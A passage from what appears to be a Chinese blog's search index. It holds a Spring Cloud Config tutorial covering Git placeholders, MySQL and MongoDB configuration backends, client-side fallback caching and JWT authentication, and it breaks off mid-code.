"96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"centos"},{title:"Config 入门教程 - 中级篇",url:"/posts/f1872086.html",text:'上篇 - Config 入门教程（基础篇） Config 入门教程 - 基础篇 前言版本说明在下面的的教程中，使用的 Spring Cloud 版本是 Finchley.RELEASE，对应的 Spring Boot 版本是 2.0.3，特别声明除外。 Config 使用技巧本地参数覆盖远程参数在某些时候需要使用当前系统的环境变量或者是应用本身设置的参数而不是使用远程拉取的参数，此时 Config Client 可以使用如下配置： 官方 Bug 解决方案： https://github.com/spring-cloud/sprmg-cloud-config/issues/651 https://github.com/spring-cloud/spring-cloud-config/issues/359 123456spring: cloud: config: overrideNone: true allowOverride: true overrideSystemProperties: false overrideNone：当 allowOverride 为 true 时，overrideNone 设置为 true，代表外部配置的优先级更低，而且不能覆盖任何已存在的属性源，默认为 false allowOverride：标识 overrideSystemProperties 属性是否启用，默认为 true，设置为 false 表示禁止用户的个性化设置 overrideSystemProperties：用来标识外部配置是否能够覆盖系统属性，默认为 true 服务端 Git 配置详解Git 中 URI 占位符Spring Cloud Config Server 支持占位符的使用，支持 ｛application｝、{profile｝、{label｝，这样的话就可以在配置 uri 的时候，通过占位符使用应用名称来区分应用对应的仓库然后进行使用。下面举例说明 {application} 占位符的使用，点击下载完整的案例代码。 Config Server 的 application.yml 配置文件如下： 123456789101112131415server: port: 9090spring: application: name: config-server cloud: config: server: git: #根据不同的应用，使用不同的Git仓库，这里需要仓库名称和仓库下面的配置文件名称一致才可以 uri: https://gitee.com/peter/{application} username: admin password: admin search-paths: book-config Config Client 的 bootstrap.yml 配置文件如下： 1234567spring: cloud: config: label: master #Git分支的名称 profile: dev #本次访问的配置项 uri: http://localhost:9090 #Config Server的地址 name: spring-cloud-config #需要从远程Git仓库读取的配置文件的名称，注意没有"yml"文件后缀 使用上面的配置后，Config Client 请求 Config Server 仓库的连接地址的 uri 变成了 https://gitee.com/peter/spring-cloud-config，连接到了 spring-cloud-config 仓库；其中仓库的名称是由 Config Client 的 spring.cloud.config.name 属性指定，请求的配置文件的完整路径是 https://gitee.com/peter/spring-cloud-config/book-config/spring-cloud-config.yml；值得注意的是，这里需要仓库名称和仓库下面的配置文件名称一致才可以。 路径搜索占位符Spring Cloud Config Server 可以使用 searchPaths 参数进行路径的搜索，支持根据路径和路径前缀等方式进行配置文件的获取。 下述配置中的 book-config 表示匹配当前路径下面所有的配置文件信息，book-config* 表示在以 book-config 为前缀的文件夹内搜索所有配置文件。 1234567891011121314server: port: 9090spring: application: name: config-server cloud: config: server: git: uri: https://gitee.com/peter/spring-cloud-config username: admin password: admin search-paths: book-config, book-config* 下述配置中使用占位符的形式进行目录搜索，这样就可以根据不同的项目，对不同的配置文件进行路径搜索，从而很好地划分配置文件。值得注意的是，这里占位符的前后需要加上单引号，否则占位符无法生效。 123456789101112spring: application: name: config-server cloud: config: server: git: #根据不同的应用，搜索不同的目录路径，这里需要目录名称和目录里的配置文件名称一致才可以 uri: https://gitee.com/peter/spring-cloud-config username: admin password: admin search-paths: \'{application}\' 模式匹配和多个存储库在 application 和 profile 的使用上，Spring Cloud Config Server 还支持更复杂配置模式，可以使用通配符 {application}/{profile} 进行规则匹配，多个规则需要通过逗号分隔。以下配置中的 spring.cloud.config.server.uri 指明了默认的仓库地址，在使用 {application}/{profile} 匹配不上任何一个仓库时，会使用默认的仓库进行匹配来获取信息。对于 spring-cloud-config-simples 匹配的是 spring-cloud-config-simples/*，需要注意的是其仅能匹配应用名称为 spring-cloud-config-simples 的所有 profile 配置；对于 local 的仓库将会匹配所有的应用名以 local 开头的 Profiles。 123456789101112131415spring: cloud: config: server: git: uri: https://gitee.com/peter/spring-cloud-config search-paths: SC-BOOK-CONFIG repos: simple: https://gitee.com/peter/simple special: pattern: special*/dev*,*special*/dev* uri: https://gitee.com/peter/spring-cloud-config-special local: pattern: local* uri: /Users/peter/all_test/spring-cloud-config 关系型数据库的配置中心的实现1. 基于 MySQL 的配置概述Spring Cloud Config Server 默认提供了 JDBC 的方式连接 MySQL 数据库，整体的流程如下图，点击下载完整的案例代码。 2. 创建 Maven 父级 Pom 工程在父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体 Maven 配置如下： 1234567891011121314151617181920212223242526272829303132333435363738&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- 利用传递依赖，公共部分 --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--注意：这里需要添加以下配置，否则可能会有各种依赖问题 --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 3. 创建 Config Server 工程创建 Config Server 的 Maven 工程，配置工程里的 pom.xml 文件： 123456789101112&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-jdbc&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;&lt;/dependency&gt; 在 MySQL 中执行下述数据库脚本，创建对应的数据库和表，并插入对应的数据： 123456789101112131415161718192021-- 创建数据库create database `spring-cloud-config` default character set utf8;-- 当前数据库use `spring-cloud-config`;-- 创建类型表CREATE TABLE `PROPERTIES` ( `ID` int(11) NOT NULL AUTO_INCREMENT, `KEY` TEXT DEFAULT NULL, `VALUE` TEXT DEFAULT NULL, `APPLICATION` TEXT DEFAULT NULL, `PROFILE` TEXT DEFAULT NULL, `LABLE` TEXT DEFAULT NULL, PRIMARY KEY (`ID`)) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;-- 插入数据INSERT INTO `spring-cloud-config`.`PROPERTIES` (`ID`, `KEY`, `VALUE`, `APPLICATION`, `PROFILE`, `LABLE`) VALUES (\'3\', \'cn.springcloud.config\', \'I am the mysql configuration file from dev environment.\', \'config-client\', \'dev\', \'master\');INSERT INTO `spring-cloud-config`.`PROPERTIES` (`ID`, `KEY`, `VALUE`, `APPLICATION`, `PROFILE`, `LABLE`) VALUES (\'4\', \'cn.springcloud.config\', \'I am the mysql configuration file from test environment.\', \'config-client\', \'test\', \'master\');INSERT INTO `spring-cloud-config`.`PROPERTIES` (`ID`, `KEY`, `VALUE`, `APPLICATION`, `PROFILE`, `LABLE`) VALUES (\'5\', \'cn.springcloud.config\', \'I am the mysql configuration file from prod environment.\', \'config-client\', \'prod\', \'master\'); 添加 Config Server 需要的 application.yml 配置文件到工程中，其中 spring.cloud.config.server.jdbc.sql 是在调用时使用的 SQL，spring.profiles.active=jdbc 表示使用的激活方式是 JDBC，spring.cloud.refresh.refreshable=none 是用来解决 DataSource 循环依赖问题。若项目中需要激活其他 profile，那么可以指定多个，例如 spring.profiles.active=jdbc,dev。 1234567891011121314151617181920212223242526server: port: 8001spring: application: name: config-server cloud: config: server: jdbc: sql: SELECT `KEY`, `VALUE` FROM PROPERTIES WHERE application =? AND profile =? AND lable =? label: master refresh: refreshable: none profiles: active: jdbc datasource: url: jdbc:mysql://127.0.0.1:3306/spring-cloud-config?useUnicode=true&amp;characterEncoding=UTF-8 username: root password: 123456 driver-class-name: com.mysql.jdbc.Driverlogging: level: org.springframework.jdbc.core: DEBUG org.springframework.jdbc.core.StatementCreatorUtils: Trace 创建 Config Server 的主启动类，增加 @EnableConfigServer 注解： 12345678@EnableConfigServer@SpringBootApplicationpublic class ConfigServerApplication { public static void main(String[] args) { SpringApplication.run(ConfigServerApplication.class, args); }} 启动 Config Server 应用后，浏览器输入 http://127.0.0.1:8001/config-client/dev/master 访问 Config Server，接口返回的结果如下： 4. 创建 Config Client 工程创建 Config Client 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-config-client 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Config Server 的主启动类： 1234567@SpringBootApplicationpublic class ConfigClientApplication { public static void main(String[] args) { SpringApplication.run(ConfigClientApplication.class, args); }} 为了更好地观察拉取到的 MySQL 上面的配置，这里需要创建一个 Controller 用于访问返回配置信息，同时还需要创建一个实体，用于注入远程配置上的信息： 1234567891011121314@Component@ConfigurationProperties(prefix = "cn.springcloud")public class ConfigProperties { private String config; public String getConfig() { return config; } public void setConfig(String config) { this.config = config; }} 1234567891011@RestControllerpublic class ConfigController { @Autowired public ConfigProperties configProperties; @GetMapping("/getConfigInfo") public String getConfigInfo() { return configProperties.getConfig(); }} 添加 Config Client 需要的 application.yml 配置文件到工程中： 123456server: port: 9090spring: application: name: config-client 添加 Config Client 需要的 bootstrap.yml 配置文件到工程中： 1234567spring: cloud: config: name: config-client #需要从远程Git仓库读取的配置文件的名称，注意没有"yml"文件后缀，可以写多个，通过逗号隔开 profile: dev #本次访问的配置项 label: master #Git分支的名称 uri: http://127.0.0.1:8001 #Config Server的地址 5. 关于配置的刷新问题手动刷新和配置自动刷新对于 DB 环境下是否同时支持呢？对于 DB 操作来说，在自动刷新方面，一般是做了界面化的配置和管理，当成功提交配置到 DB 后，会调用 Config Server 的 Spring Cloud Bus 刷新接口，这样就可以实现和 Git 的 WebHook — 样的提交绑定执行功能。 6. 测试结果 依次启动 config-server、config-client 应用 访问 http://127.0.0.1:9090/getConfigInfo，接口会返回 I am the git configuration file from dev environment，说明一切运行正常 非关系型数据库的配置中心的实现基于 MongoDB 的配置概述Spring Cloud Config Server 并没有提供 MongoDB 的存储方式，但是目前 Spring Cloud 已经收录了一个相关的孵化器。整体的流程如下图，由于篇幅有限，下面只给出 Config Server 工程的核心配置和代码，而 Config Client 工程与上面 MySQL 的示例基本上一样，这里不再累述。 Config Server 工程的配置Config Server 工程的 pom.xml 文件，添加 MongoDB 的依赖支持： 123456789&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server-mongodb&lt;/artifactId&gt; &lt;version&gt;0.0.2.BUILD-SNAPSHOT&lt;/version&gt;&lt;/dependency&gt; Config Server 的主启动类，添加注解 @EnableMongoConfigServer： 12345678@SpringBootApplication@EnableMongoConfigServerpublic class MongoDbConfigServerApplication { public static void main(String[] args) { SpringApplication.run(MongoDbConfigServerApplication.class, args); }} Config Server 工程里的 application.yml 文件 123456789server: port: 8001spring: application: name: config-server data: mongodb: uri: mongodb://localhost/springcloud MongoDB 中的数据： 1234567891011{ "label" : "master", "profile" : "dev", "source" : { "cn" : { "springcloud" : { "config" : "I am the mongdb configuration file from dev environment. I will edit." } } }} Config 功能扩展客户端回退客户端的回退机制，可以处理网络中断的情况，或者配置服务因维护而关闭的场景。当启用回退时，客户端适配器将 “缓存” 本地文件系统中的配置属性。要启用回退功能，只需指定存储缓存的位置即可；这个功能也称之为客户端高可用的一部分，也就是在服务端无法连接的情况下，客户端依然是可以用的，点击下载完整的案例代码。 1. 准备工作由于下面的 Spring Cloud Config 使用 Git 作为存储方式，因此需要提前在 Git 远程仓库（Github、Gitlab）中创建对应的仓库，然后往仓库里 Push 三个配置文件，分别是 config-client-dev.yml、config-client-prod.yml、config-client-test.yml，配置文件的内容如下： 123456server: port: 9001cn: springcloud: config: I am the git configuration file from dev environment 123456server: port: 9002cn: springcloud: config: I am the git configuration file from prod environment 123456server: port: 9003cn: springcloud: config: I am the git configuration file from test environment 2. 创建 Config Client Fallback Autoconfig 工程创建 Config Client Fallback Autoconfig 工程，配置工程里的 pom.xml 文件，其中 spring-security-rsa 依赖主要是用于当配置信息中存在敏感信息（如用户名密码）时，对敏感信息加密后再缓存在本地： 123456789&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-config&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.security&lt;/groupId&gt; &lt;artifactId&gt;spring-security-rsa&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Config Client Fallback Autoconfig 工程里的 FallbackableConfigServicePropertySourceLocator 类，主要用来创建本地回退文件，也就是加载远程配置文件后在本地备份一份： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162@Order(0)public class FallbackableConfigServicePropertySourceLocator extends ConfigServicePropertySourceLocator { private boolean fallbackEnabled; private String fallbackLocation; @Autowired(required = false) TextEncryptor textEncryptor; public FallbackableConfigServicePropertySourceLocator(ConfigClientProperties defaultProperties, String fallbackLocation) { super(defaultProperties); this.fallbackLocation = fallbackLocation; this.fallbackEnabled = !StringUtils.isEmpty(fallbackLocation); } @Override public PropertySource&lt;?&gt; locate(Environment environment) { PropertySource&lt;?&gt; propertySource = super.locate(environment); if (fallbackEnabled) { if (propertySource != null) { storeLocally(propertySource); } } return propertySource; } private void storeLocally(PropertySource propertySource) { StringBuilder sb = new StringBuilder(); CompositePropertySource source = (CompositePropertySource) propertySource; for (String propertyName : source.getPropertyNames()) { Object value = source.getProperty(propertyName); if (textEncryptor != null) value = "{cipher}" + textEncryptor.encrypt(String.valueOf(value)); sb.append(propertyName).append("=").append(value).append("\\n"); } System.out.println("file contents : " + sb.toString()); saveFile(sb.toString()); } private void saveFile(String contents) { BufferedWriter output = null; File file = new File(fallbackLocation + File.separator + ConfigServerBootstrap.FALLBACK_FILE_NAME); try { if (!file.exists()) { file.createNewFile(); } output = new BufferedWriter(new FileWriter(file)); output.write(contents); } catch (IOException e) { e.printStackTrace(); } finally { if (output != null) { try { output.close(); } catch (IOException e) { System.out.print("Error" + e.getMessage()); } } } }} 创建 Config Client Fallback Autoconfig 工程的自动配置类，添加相关注解，使其在 Spring Boot 启动的时候进行加载。其中 spring.cloud.config.fallbackLocation 是指回退配置文件所在的目录路径，file:${spring. cloud.config.fallbackLocation:}/fallback.properties 是指回退配置文件的完整路径： 12345678910111213141516171819202122232425262728293031/** * 客户端自动配置依赖启动 */@Configuration@EnableConfigurationProperties@PropertySource(value = {"config-client.properties", "file:${spring.cloud.config.fallbackLocation:}/fallback.properties"}, ignoreResourceNotFound = true)public class ConfigServerBootstrap { public static final String FALLBACK_FILE_NAME = "fallback.properties"; @Autowired private ConfigurableEnvironment environment; @Value("${spring.cloud.config.fallbackLocation:}") private String fallbackLocation; @Bean public ConfigClientProperties configClientProperties() { ConfigClientProperties clientProperties = new ConfigClientProperties(this.environment); clientProperties.setEnabled(false); return clientProperties; } @Bean public FallbackableConfigServicePropertySourceLocator fallbackableConfigServicePropertySourceLocator() { ConfigClientProperties client = configClientProperties(); FallbackableConfigServicePropertySourceLocator fallbackableConfigServicePropertySourceLocator = new FallbackableConfigServicePropertySourceLocator(client, fallbackLocation); return fallbackableConfigServicePropertySourceLocator; }} 创建 Config Client Fallback Autoconfig 工程里的 /src/main/resources/config-client.properties 配置文件： 1spring.cloud.config.enabled=false 创建 Config Refresh Fallback Autoconfig 工程里 /src/main/resources/META-INF/spring.factories 配置文件，添加上面的自动配置类： 12org.springframework.cloud.bootstrap.BootstrapConfiguration=\\com.springcloud.study.fallback.config.ConfigServerBootstrap 3. 创建 Config Client 工程创建 Config Client 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入上面的 config-client-fallback-autoconfig： 123456789&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.springcloud.study&lt;/groupId&gt; &lt;artifactId&gt;config-client-fallback-autoconfig&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/dependency&gt; 创建 Config Client 的主启动类： 1234567@SpringBootApplicationpublic class ConfigClientApplication { public static void main(String[] args) { SpringApplication.run(ConfigClientApplication.class, args); }} 为了更好地观察拉取到的 Git 上面的配置，这里需要创建一个 Controller 用于访问返回配置信息，同时还需要创建一个实体，用于注入远程配置上的信息： 1234567891011121314@Component@ConfigurationProperties(prefix = "cn.springcloud")public class ConfigProperties { private String config; public String getConfig() { return config; } public void setConfig(String config) { this.config = config; }} 1234567891011@RestControllerpublic class ConfigController { @Autowired public ConfigProperties configProperties; @GetMapping("/getConfigInfo") public String getConfigInfo() { return configProperties.getConfig(); }} 添加 Config Client 需要的 application.yml 配置文件到工程中： 123spring: application: name: config-client 添加 Config Client 需要的 bootstrap.yml 配置文件到工程中，fallbackLocation 指定了回退文件的路径： 12345678spring: cloud: config: name: config-client #需要从远程Git仓库读取的配置文件的名称，注意没有"yml"文件后缀，可以写多个，通过逗号隔开 profile: dev #本次访问的配置项 label: master #Git分支的名称 uri: http://127.0.0.1:8001 #Config Server的地址 fallbackLocation: /tmp/config/config-client-dev/ #回退文件的路径 4. 创建 Config Server 工程创建 Config Server 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-config-server 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Config Server 的主启动类，增加 @EnableConfigServer 注解： 12345678@EnableConfigServer@SpringBootApplicationpublic class ConfigServerApplication { public static void main(String[] args) { SpringApplication.run(ConfigServerApplication.class, args); }} 添加 Config Server 需要的 application.yml 配置文件到工程中： 123456789101112131415server: port: 8001spring: application: name: config-server cloud: config: server: git: uri: git@github.com:xxxxx/spring-cloud-config-study-repo.git search-paths: spring-cloud-config-study-repo/ strictHostKeyChecking: false private_key_file: /root/.ssh/id_rsa.pub label: master 5. 测试结果 依次启动 config-server、config-client 应用 访问 http://127.0.0.1:9001/getConfigInfo 后观察返回的配置信息，与此同时查看是否在目录 /tmp/config/config-client-dev/ 下成功创建了回退文件 fallback.properties 关闭 config-server、config-client 应用，然后单独启动 config-client 应用；观察在不启动 config-server 的情况下，config-client 应用是否能正常启动 若 config-client 应用单独启动成功，config-client 应用会先尝试去连接 config-server，当连接失败后，会加载本地的回退配置文件，此时控制台输出的日志信息如下： 1234c.c.c.ConfigServicePropertySourceLocator : Fetching config from server at : http://127.0.0.1:8001c.c.c.ConfigServicePropertySourceLocator : Connect Timeout Exception on Url - http://127.0.0.1:8001. Will be trying the next url if availablec.c.c.ConfigServicePropertySourceLocator : Could not locate PropertySource: I/O error on GET request for "http://127.0.0.1:8001/config-client/dev/master": 拒绝连接; nested exception is java.net.ConnectException: 拒绝连接c.s.study.ConfigClientApplication : No active profile set, falling back to default profiles: default 客户端的安全认证机制 JWTSpring Cloud Config 客户端支持使用 JWT 身份验证方法代替标准的基本身份验证，这种方式需要对服务端和客户端都要改造，点击下载完整的案例代码，具体的验证步骤如下： 客户端向服务端负载授权的 RestController 发送请求，并且带上用户名和密码 服务端成功验证用户名和密码后，返回 Jwt Token 客户端加载服务端的配置信息，需要在 Header 中带上 Token 令牌进行认证 i. 准备工作本示例用到上面的 “客户端回退” 示例中 Git 仓库里的配置文件，包括 config-client-dev.yml、config-client-prod.yml、config-client-test.yml。 ii. 创建 Config Client Jwt 工程创建 Config Client Jwt 工程，配置工程里的 pom.xml 文件： 12345678910111213&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-autoconfigure&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-configuration-processor&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-config&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Config Client Jwt 工程的自动配置类，@PostConstruct 注解是执行是在 Servlet 构造函数和 init() 方法执行之间，也就是说在容器启动过程中会创建一个 RestTemplate 对象，将用户名和密码发送到 Config Server 端进行认证；认证成功会返回 Token，如果认证过程中用户名或者是密码错误，则将返回一个 401 认证失败的错误码。其中 ${spring.cloud.config.usemame}、 ${spring.cloud.config.password} 等参数是配置在客户端的，这里需要创建 ConfigServicePropertySourceLocator 这个 Bean 并且自定义一个 RestTemplate 对象需要带上 Token 信息，这就是代码中的 customRestTemplate 方法。还需要定义一个 ClientHttpRequestlnterceptor 接口的实现类，也就是代码中的 GenericRequestHeaderInterceptor 类，主要用于拦截发送到 Config Server 获取配置信息的请求，将 Token 信息添加到 HttpServletRequest 的 Headers 中。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112@Configuration@Order(Ordered.LOWEST_PRECEDENCE)public class ConfigClientBootstrapConfiguration { private static Log logger = LogFactory.getLog(ConfigClientBootstrapConfiguration.class); @Value("${spring.cloud.config.username}") private String jwtUserName; @Value("${spring.cloud.config.password}") private String jwtPassword; @Value("${spring.cloud.config.endpoint}") private String jwtEndpoint; private String jwtToken; @Autowired private ConfigurableEnvironment environment; @PostConstruct public void init() { RestTemplate restTemplate = new RestTemplate(); LoginRequest loginBackend = new LoginRequest(); loginBackend.setUsername(jwtUserName); loginBackend.setPassword(jwtPassword); String serviceUrl = jwtEndpoint; Token token; try { token = restTemplate.postForObject(serviceUrl, loginBackend, Token.class); if (token.getToken() == null) { throw new Exception(); } // 设置token setJwtToken(token.getToken()); } catch (Exception e) { e.printStackTrace(); } } public String getJwtToken() { return jwtToken; } public void setJwtToken(String jwtToken) { this.jwtToken = jwtToken; } @Bean public ConfigServicePropertySourceLocator configServicePropertySourceLocator(ConfigClientProperties configClientProperties) { ConfigServicePropertySourceLocator configServicePropertySourceLocator = new ConfigServicePropertySourceLocator(configClientProperties); configServicePropertySourceLocator.setRestTemplate(customRestTemplate()); return configServicePropertySourceLocator; } @Bean public ConfigClientProperties configClientProperties() { ConfigClientProperties clientProperties = new ConfigClientProperties(this.environment); clientProperties.setEnabled(false); return clientProperties; } /** * 自定义restTemplate ，在发送的时候带上token * * @return */ private RestTemplate customRestTemplate() { Map&lt;String, String&gt; headers = new HashMap&lt;&gt;(); headers.put("token", "Bearer:" + jwtToken); SimpleClientHttpRequestFactory requestFactory = new SimpleClientHttpRequestFactory(); requestFactory.setReadTimeout((60 * 1000 * 3) + 5000); RestTemplate template = new RestTemplate(requestFactory); if (!headers.isEmpty()) { template.setInterceptors( Arrays.&lt;ClientHttpRequestInterceptor&gt;asList(new GenericRequestHeaderInterceptor(headers))); } return template; } /** * 客户端请求过滤器 */ public static class GenericRequestHeaderInterceptor implements ClientHttpRequestInterceptor { private final Map&lt;String, String&gt; headers; public GenericRequestHeaderInterceptor(Map&lt;String, String&gt; headers) { this.headers = headers; } /** * 请求之前操作的方法 * * @param httpRequest * @param bytes * @param clientHttpRequestExecution * @return * @throws IOException */ @Override public ClientHttpResponse intercept(HttpRequest httpRequest, byte[] bytes, ClientHttpRequestExecution clientHttpRequestExecution) throws IOException { headers.entrySet().stream().forEach(header -&gt; { httpRequest.getHeaders().add(header.getKey(), header.getValue()); }); return clientHttpRequestExecution.execute(httpRequest, bytes); } }} 创建 Config Client Jwt 工程里的实体类，用于传递用户信息： 123456789101112@JsonIgnoreProperties(ignoreUnknown = true)@JsonInclude(JsonInclude.Include.NON_NULL)public class LoginRequest implements Serializable { @JsonProperty private String username; @JsonProperty private String password; //省略getter、setter方法} 123456789@JsonIgnoreProperties(ignoreUnknown = true)@JsonInclude(JsonInclude.Include.NON_NULL)public class Token implements Serializable { @JsonProperty private String token; //省略getter、setter方法} 在 Config Client Jwt 工程里创建 /src/main/resources/META-INF/spring.factories 配置文件，添加上面的自动配置类： 12org.springframework.cloud.bootstrap.BootstrapConfiguration=\\com.springcloud.study.config.ConfigClientBootstrapConfiguration iii. 创建 Config Server 工程创建 Config Server 工程，配置工程里的 pom.xml 文件： 123456789101112131415161718&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt; &lt;artifactId&gt;jjwt&lt;/artifactId&gt; &lt;version&gt;0.9.1&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.google.code.gson&lt;/groupId&gt; &lt;artifactId&gt;gson&lt;/artifactId&gt; &lt;version&gt;2.7&lt;/version&gt;&lt;/dependency&gt; 创建 Config Server 工程里的 JwtAuthenticationRequest 实体类，用于传递用户名和密码： 12345678910111213141516public class JwtAuthenticationRequest implements Serializable { private String username; private String password; public JwtAuthenticationRequest() { super(); } public JwtAuthenticationRequest(String username, String password) { this.setUsername(username); this.setPassword(password); } //省略getter、setter方法} 创建 Config Server 工程里的 JwtAuthenticationResponse 实体类，用于返回 Token 信息： 12345678910public class JwtAuthenticationResponse implements Serializable { private final String token; public JwtAuthenticationResponse(String token) { this.token = token; } //省略getter、setter方法} 创建 Config Server 工程里的 JwtUser 实体类，用于返回 JWT 用户认证信息： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556public class JwtUser implements UserDetails { private final String username; private final String password; private final Collection&lt;? extends GrantedAuthority&gt; authorities; public JwtUser(String username, String password, Collection&lt;? extends GrantedAuthority&gt; authorities) { this.username = username; this.password = password; this.authorities = authorities; } @Override public String getUsername() { return username; } @JsonIgnore @Override public boolean isAccountNonExpired() { return true; } @JsonIgnore @Override public boolean isAccountNonLocked() { return true; } @JsonIgnore @Override public boolean isCredentialsNonExpired() { return true; } @JsonIgnore @Override public String getPassword() { return password; } @Override public Collection&lt;? extends GrantedAuthority&gt; getAuthorities() { return authorities; } @Override public boolean isEnabled() { return true; } @Override public String toString() { return "JwtUser [username=" + username + ", password=" + password + ", authorities=" + authorities + "]"; }} 创建 Config Server 工程里的 JWT Token 认证过滤器： 12345678910111213141516171819202122232425262728public class JwtAuthenticationTokenFilter extends UsernamePasswordAuthenticationFilter { @Autowired private UserDetailsService userDetailsService; @Autowired private JwtTokenUtil jwtTokenUtil; private final String tokenHeader = "token"; @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { HttpServletRequest httpRequest = (HttpServletRequest) request; String authToken = httpRequest.getHeader(tokenHeader); String username = jwtTokenUtil.getUsernameFromToken(authToken); if (username != null &amp;&amp; SecurityContextHolder.getContext().getAuthentication() == null) { UserDetails userDetails = this.userDetailsService.loadUserByUsername(username); if (jwtTokenUtil.validateToken(authToken, userDetails)) { UsernamePasswordAuthenticationToken auth = new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities()); auth.setDetails(new WebAuthenticationDetailsSource().buildDetails(httpRequest)); SecurityContextHolder.getContext().setAuthentication(auth); } } chain.doFilter(request, response); }} 创建 Config Server 工程里的 JWT 工具类，主要用于根据传递过来的用户信息生成 JWT 的 Token，或者是验证请求的 Token 是否合法： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104@Componentpublic class JwtTokenUtil implements Serializable { private static final long serialVersionUID = -8652360919584431721L; private static final String CLAIM_KEY_USERNAME = "sub"; private static final String CLAIM_KEY_AUDIENCE = "audience"; private static final String CLAIM_KEY_CREATED = "created"; private static final String AUDIENCE_UNKNOWN = "unknown"; private static final String AUDIENCE_WEB = "web"; private Key secret = MacProvider.generateKey(); private Long expiration = (long) 120; // 2 minutes /** * 生成token * * @param userDetails * @return */ public String generateToken(JwtUser userDetails) { Map&lt;String, Object&gt; claims = new HashMap&lt;&gt;(); claims.put(CLAIM_KEY_USERNAME, userDetails.getUsername()); claims.put(CLAIM_KEY_AUDIENCE, AUDIENCE_WEB); claims.put(CLAIM_KEY_CREATED, new Date().getTime() / 1000); return generateToken(claims); } /** * jwt 实际生成token * * @param claims * @return */ private String generateToken(Map&lt;String, Object&gt; 